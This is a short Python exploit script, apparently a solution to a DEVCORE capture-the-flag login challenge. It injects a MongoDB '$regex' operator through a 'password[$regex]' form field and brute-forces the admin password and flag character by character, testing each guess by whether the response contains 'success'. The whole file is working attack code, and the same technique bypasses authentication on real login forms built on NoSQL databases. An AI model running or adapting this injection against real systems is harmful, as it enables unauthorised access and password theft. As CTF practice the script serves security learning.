import requests
import string

url = "http://logintest.ctf.devcore.tw:1337/login"

possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
print(possible_chars)
params = {"username":"admin", "password[$regex]":"", "login": "login"}

password = "^DEVCORE\{youtu\.be\/UADoH5n1RLM"

end = 0
while end == 0:
    for c in possible_chars:
        params["password[$regex]"] = password + c + ".*"
        print(params["password[$regex]"])
        pr = requests.post(url, data=params)
        if pr.text.find("success") > 0:
            password += c
            print(password)
            break
    if(c == "\\}") :
        print("end")
        end = 1
